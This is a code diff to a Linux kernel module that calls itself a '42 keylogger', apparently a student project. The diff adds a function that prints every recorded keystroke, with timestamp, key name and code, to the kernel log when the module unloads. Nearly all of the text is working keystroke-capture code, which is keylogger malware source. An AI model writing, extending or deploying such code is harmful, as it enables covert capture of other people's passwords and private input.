@@ -320,6 +320,22 @@ out:
 	return ret;
 }
 
+static void write_kernel_log(void)
+{
+	struct stroke_s *cur = NULL;
+
+	list_for_each_entry(cur, &strokehead, list) {
+		if (cur->ascii && IS_PRESSED(cur->state)) {
+			pr_notice("%02d:%02d:%02d   %-13s (%#.2x)\n",
+				cur->time.tm_hour,
+				cur->time.tm_min,
+				cur->time.tm_sec,
+				cur->name,
+				cur->key);
+		}
+	}
+}
+
 static int __init init_keyboard(void)
 {
 	int ret;
@@ -343,6 +359,7 @@ static void __exit exit_keyboard(void)
 	tasklet_kill(&tasklet_s);
 	if (write_log() < 0)
 		pr_warn("WARNING! Something went wrong writing log file.\n");
+	write_kernel_log();
 	free_list();
 	pr_info("UNLOADED -- 42 keylogger module.\n");
 	misc_deregister(&misc_s);
